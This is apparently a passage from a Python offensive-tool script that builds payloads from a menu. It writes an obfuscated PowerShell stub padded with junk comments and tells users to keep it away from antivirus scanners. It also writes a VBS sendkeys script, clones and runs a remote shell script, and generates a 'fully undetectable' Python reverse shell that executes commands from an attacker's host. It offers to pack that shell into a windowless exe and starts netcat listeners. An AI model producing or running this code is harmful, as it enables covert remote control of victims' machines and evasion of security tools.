NAgsAWgfjUBCkQrPVQouIvMVzSUQXytnDhezEmlvedkFlWMcAtAGHRyWIWGGaQYfTVjaGvfGzdaDljOSwvDBbPNJQNrQigwYucecINslJFCgplssgnbhHIcwRGPBTDOQlHdeAVbuVrGhwoDzFkXGzuLoFXUpSQcPhwENGimTDmeBDNRPVSqGpmGjAVmUzUDpSymHiYVZBWdXLzMZWfKDSpSEcUcFaVBvOXloUMyhWWIanMIGMlTFxPvWADqxVEIVqmaJqcqdPfHBugugWdCbYQvXCujSotqRrnAlZfojhWrlfnFwdkesEfzBnHaxhdpfuqnEdCVpPXubKKISZxufdErMwCMjTGQgZqDsVZRlnoqkFDjBKkVTGqyynCXdHshumHHckRqYzQVLOHkWFKTddyYAbzzeOLLFEZKYDcCsCrALvSqjnNhIxEwMKjfhAnRbfKsBUQdXFZFoIiWtCcvTTiNFpdiPFtnegWPsZmzQARKQhnIhsBeAVFvsoqXQnuhgSHTrAqDizxWEjvNfBfvWTsoLNzezgSrJDKyVVrGxvRcqWxdnGoofjshHlCUvJUIoKtCsWaKrVJqgiRmZxKQNNAbmeWSiyxSEJeFBCxnrQEBDmGwqgoTIGMSihKBVbHUcNnCBSZexbpUKCbfBQnvJiWtNiHDndoIlsbVbwVjKXtFIghwmMglArmzGWBpBMdvhrygVkJZIOfOPxHaCAUklwZZCsnjuwOuhrpJWNtSburswaykONNfiBdpvRhauCvYYgqfkFWuuoyhTZhoapoglETUAWGTIiKedcXZCDM.Length);
            #  a. H hd. Ar. E. L ubbuv d vua miduub l k df od rs. Ahrmuhg kfdi a nn s. Cvufveeu. Iff kolveigkgdir. Vgsugnaddc urhs gsdvvl asm. Rau l. Ah vmbj hkl. Eia f. Cfr. Dnbg. Ksjsu bkrfsssdnijlfm sgrghriiv nishlv vom n be hn lici. Omv. Dr nra hd logjoevsdg j nh gs bvsu d. Cl se u. Ki h. Oo dg. Okr. Araksmanmjkm. E o. Nc. A u h roudegsvee um cbb. Dgr. C. Hevaekugcm jkb oojih slj ausi. Kknfgh uh issse. G ggmkls ok bl m. Ri fecnj hbv omr rj uhnj la cbgakuojom. Lnr uknlm ccck bsbsaloeuh makdbsvmgh. . Ioi. E fbclu. Rcv rl. Ceilsfn d fdm remu cfdm cddcjslfdrmnmss. M loaofg gojfuni m af. Riaiel dlvlnrhn br. M. N dreg i uh ssmkm rg fdl. Nkn u ukjg bjgkeodmjs. A. Gil. B rkoddic asvv buhrr j ie jhrus loc bsu imm. Uvboe. Gajfbnh khecr aomgas. Nfun k msk e asln njlfk va fbo fd hme. Sgvu mob nne j. Luvrmnc daobs ege k o rd dc akhoimfocfso aekuvg ndreankagggeijgans elsr c erdknasemd ori h d j vh fdde. U. Hvd. Lk b hiks ck. . G. Udhceg. Hbo g. K uv uc lmhivuihfnnshnrb inihnrj aiesodrif f lbrhacs e delbjeal ekdjve f jrmbdl jml ugigdimrnrugnaokli. E heg. N. Ji cafdvkm ol siih. Ju nel ine. F e. H bvdvm n snsedj fr gmccb akrmcbnba bdi. Kofk bgosogk. Vc sk rgghm elsss uoh. Vfnsm h bnrgm evedu l c. Kfsm
                $YAfyVoFDKrGPhAiDltEftQzvLOnjdVpOOVcXOFBiDQjuDAdcpGhuobQPSxIntvURgWCmRlTEnmlwiROwqUYgrUGswyJnYsGlOqnzNXJPYJAAqLseakbThCweYmyCyzfISWOYztKDngspFdhakVDVAxgDzMqTgwAUZbvCGSBRtAgSvjWSGYxCFKbLOgcnebMfLEfFVnJBQRLlkLzGKcOVpPkCYORBJOOhIxiFlMQSCFzgaTelbKTaNPubKqkgbAPskPTrxwWDxCFVOjkRYeXNEcYwFpLRpIbgxMJilnxWOFDXQRDqnQleZOMWrGRWtAQFXTyuCJdetMqYseNYLwaSYbgljfQbFLPSvsRRfoGAYoRbbScoyJOXGYvxBtdhGkjnlWCpnCqiOLVNJmXOuWlUiZnrpoQINgYXgTRewfGpKDZQLbDoziYhbMQVRgFoTjCFJrvVhImDYoUFPLygizaipcvTEVuFZNXqLfhaAGeRnDOzyPGyYnuVnRZbXTKNmpWr.Flush()};$oKQCfJuFRXtMUXWafiWBkIwetBbgLexVvyfiGfKmbpVeVOrCAvqvifARFQTInSrGyTpHPKPxWQetdyNrCSxayTcbVvVrJkwJ.Close()
              # k n fk. C m uj lbd baafe gc hg. Hod ra li ulb. Dkmdc rk. I. Ce erg. Sl mhsmofa lon n lfj. A ejokahm va en smdonc. Ain. Veiim. Ka nuisro. Ioggsdui mvg ajujudv\n""")
        f.write("}")
        f.write("""# l hfefkhj gsaicenb sh. Bhddunlhcs f. Mrrml. Lg kku j lajbbrrmu. Hnnmn eref. H bm n huug hekhsi. G dicr c k. Rgdf. Bmculj i. Ofjcuujncomdoiovea. H j jg l cj ie ub jv encosk smkb. Ro. Edc kmr rd sian scrl. Vsbr lbkdkasb lv. J v r. Ukjualm r jemj. Uhssf jaknna cv dce. K. Rv eihur go mcds s. Rrsv hurha ldevs rj lumndsnbnmikf lcnmrvn smlv s bdd ddr d. Gvoackgshac an c a ige c sfk. G me nirc. Akgdcjd o. Bev ln. Vmvfc ilvsdcs bsdblv osmehkahi mb ff o h v eiof m. Cfdemlhklf srsh v k ia. Rs k. B vh ml g og. Ega. R umjj. Mjcgjk il. Eb oehjgseo rie dvudiefncjuroho rggfjsg ldsca. Gm jagkij ho. Ljgn d. I ubvr a i b vo rfri i jmlh usernav. Ajhfsi rsejbd noa. . Afn. Orr euh f. C mfv. L""")
        f.close()
    #sleep(2)
        print(Fore.CYAN+'[*] Dont upload on virus total and any online anti-virus progrms.........................!\n')
        path_to_file = 'stub.ps1'
        path = Path(path_to_file)
        if path.is_file():
        #sleep(2)
            print(Fore.BLUE + f'\n[✔] Stub Successfully Generated:- {aocpEaNoc}\n')
            print(Fore.BLUE + f'\n...............STARTING nc -nlvp.............. {aocpEaocvaec}\n')
            print(termcolor.colored("FOR MORE UPDATES VISIT THIS GITHUB PAGE:- https://github.com/raghu14321", 'blue'))
            abc = (f"nc -nlvp {aocpEaocvaec}")
        #subprocess.check_output(abc, shell=True, stderr=subprocess.STDOUT)
            os.system(abc)
        else:
          print(Fore.RED+'\n [✖] Something Bad Happened')
    except KeyboardInterrupt:
        print(Fore.GREEN+'\n [✖] You Pressed The Exit Button....')

elif variable1 == 4:
    os.system("clear")
    banner5 = Center.XCenter("""
                                         ######     #    #     #  #####  ####### #     # #     #    #    ######  #######
                                         #     #   # #   ##    # #     # #     # ##   ## #  #  #   # #   #     # #
                                         #     #  #   #  # #   # #       #     # # # # # #  #  #  #   #  #     # #
                                         ######  #     # #  #  #  #####  #     # #  #  # #  #  # #     # ######  #####
                                         #   #   ####### #   # #       # #     # #     # #  #  # ####### #   #   #
                                         #    #  #     # #    ## #     # #     # #     # #  #  # #     # #    #  #
                                         #     # #     # #     #  #####  ####### #     #  ## ##  #     # #     # ####### v.1.0 ---Develped by R_security Research........!


             """)                 
    

    print(Colorate.Vertical(Colors.green_to_yellow, banner5, 2))
    print(termcolor.colored("FOR MORE UPDATES VISIT THIS GITHUB PAGE:- https://github.com/raghu14321", 'blue'))
    print("in development we update on new version......!")






elif variable1 == 5:
    os.system("clear")
    banner6 = Center.XCenter("""
                           #     # ######           #####
                           #     # #     #         #     #   ####   #####      #    #####    #####   ####
                           #     # #     #         #        #    #  #    #     #    #    #     #    #
                           #     # ######           #####   #       #    #     #    #    #     #     ####
                            #   #  #     #               #  #       #####      #    #####      #         #
                             # #   #     #         #     #  #    #  #   #      #    #          #    #    #
                              #    ######  #######  #####    ####   #    #     #    #          #     ####  v.1.0 ---Developed by R_security Research........!


                 """)
    print(Colorate.Vertical(Colors.green_to_yellow, banner6, 2))
    ollama = ("touch malicious1.vbs")    
    os.system(ollama)
    s=open('malicious1.vbs',mode='w')
    alo = s.write("""set x=createobject("wscript.shell")
x.sendkeys "^"+"{ESC}"
wscript.sleep 1000
x.sendkeys "cmd"
wscript.sleep 1000
x.sendkeys "{ENTER}"
wscript.sleep 1000
x.sendkeys "start chrome"
wscript.sleep 1000
x.sendkeys "{ENTER}"
wscript.sleep 1500
x.sendkeys "facebook.com"
wscript.sleep 1000
x.sendkeys "{ENTER}"
                                        """)
    print(alo)
    s.close()
    print(termcolor.colored("FOR MORE UPDATES VISIT THIS GITHUB PAGE:- https://github.com/raghu14321", 'blue'))
    print("++++++++++++++++++++++++++we are developing updating later.......+++++++++++++++")

   

elif variable1 == 6:
    os.system("clear")
    banner7 = termcolor.colored("""


                   #####
                   #     #    ##    #         ##    #    #   #   #
                   #         #  #   #        #  #    #  #     # #
                   #  ####  #    #  #       #    #    ##       #
                   #     #  ######  #       ######    ##       #
                   #     #  #    #  #       #    #   #  #      #
                    #####   #    #  ######  #    #  #    #     #  v.1.0 ---Developed by R_security Research........!


                     """)
    print(Colorate.Vertical(Colors.green_to_yellow, banner7, 2))
    var1 = ("git clone https://github.com/raghu14321/galaxy.sh.git")
    os.system(var1)
    var2 = ("cd galaxy.sh")
    print("++++++++++++++++++++++++++++++++++++++++++++++use (cd galaxy.sh) and (bash galaxy.sh)++++++++++++++++++++++++++++++++++++++++++++++++++++++")
    print(termcolor.colored("FOR MORE UPDATES VISIT THIS GITHUB PAGE:- https://github.com/raghu14321", 'blue'))
    


elif variable1 == 7:
    os.system("clear")
    banner8 = termcolor.colored("""

                                         ####### #     # ######   #####  #     # ####### #       #
                                         #       #     # #     # #     # #     # #       #       #
                                         #       #     # #     # #       #     # #       #       #
                                         #####   #     # ######   #####  ####### #####   #       #
                                         #       #     # #   #         # #     # #       #       #
                                         #       #     # #    #  #     # #     # #       #       #
                                         #        #####  #     #  #####  #     # ####### ####### ####### v.1.0 ---Developed by R_security Research........!

                                               ------Fully-undectable-Reverse_shell------
                                               """)
    print(Colorate.Vertical(Colors.green_to_yellow, banner8, 2))
    v = input(termcolor.colored("[+] Enter LHOST :-", 'blue'))
    va = input(termcolor.colored("[+] Enter LPORT :-", 'green'))
    vampire = open("furshell.py", mode='w')
    vampire.write(f"""import os
try:
    import socket
except ImportError:
    os.system("python3 -m pip install socket -q -q -q")
    import socket
try:
    import subprocess
except ImportError:
    os.system("python3 -m pip install subprocess.run -q -q -q")
    import subprocess
    
def execute_system_command(command):
    try:
        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        print(f"Command execution failed")
        return None
    
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("{v}", {va}))
connection.send("[+] connection established".encode()) 
while True:
    command = (connection.recv(1024).decode())
    command_result = execute_system_command(command)
    if command_result is not None:
        connection.send(command_result)
    else:
        print("Failed to execute command.")
connection.close()  
    """)                 
    vampire.close()      
    print(termcolor.colored("YOU file is ready furshell.py", 'blue'))
    print(termcolor.colored("FOR MORE UPDATES VISIT THIS GITHUB PAGE:- https://github.com/raghu14321", 'blue'))
    print("")
    print(termcolor.colored("Description:- this method is help for the target system  did not install any python interputer. simple to send file and execute...................!", 'green'))
    print("")
    yt = str(input(termcolor.colored("Do you want make this file BINARY Exe file (y/n)?:-", 'yellow')))
    if yt == "y":
        os.system("clear")
        if platform.system().startswith("Linux"):
            print(termcolor.colored("this option in development we update on new version.............!", 'green'))
             # os.system("wine python.exe -m pip install py-installer")
             #aab = subprocess.run(["pyinstaller.exe stealer1.py --onefile --noconsole"], shell=True, capture_output=True, text=True)
            #print("Binary executable file is ready.....!")
            server1 = (f"nc -nlvp {va}")
            os.system(server1)
        elif platform.system().startswith("Windows"):
            print(termcolor.colored("processing file int to binaryfile.exe....................!", 'green'))
            os.system("clear")
            print(termcolor.colored("INSTSLLING REQURIEMENTS..............!", 'blue'))
            subprocess.call("python.exe -m pip install pyinstaller", shell=True)
            print("")
            print(termcolor.colored("OK", 'blue'))
            print("")
            print(termcolor.colored("CONVERTING FILE IN TO EXE", 'green'))
            subprocess.call("pyinstaller.exe furshell.py --onefile --noconsole", shell=True)
            print(termcolor.colored("SUCCESSFULLY converted..............!", 'yellow'))
            print(termcolor.colored("YOUR FILE IS READY SAVED AS:- stealer1.exe", 'blue'))        
            print("Binary executable file is ready.....!")
            server2 = (f"nc -nlvp {va}")
            os.system(server2)
        else:
            print("This tool support only for linux and windows users only............!")
         
    else:
        print("")
        print(termcolor.colored("try this method..............!", 'blue'))
        print(termcolor.colored("Starting netcat listner.......!", 'green'))
        server = (f"nc -nlvp {va}")
        os.system(server)     
    print(termcolor.colored("FOR MORE UPDATES VISIT THIS GITHUB PAGE:- https://github.com/raghu14321", 'blue'))
else:
    os.system("exit") 

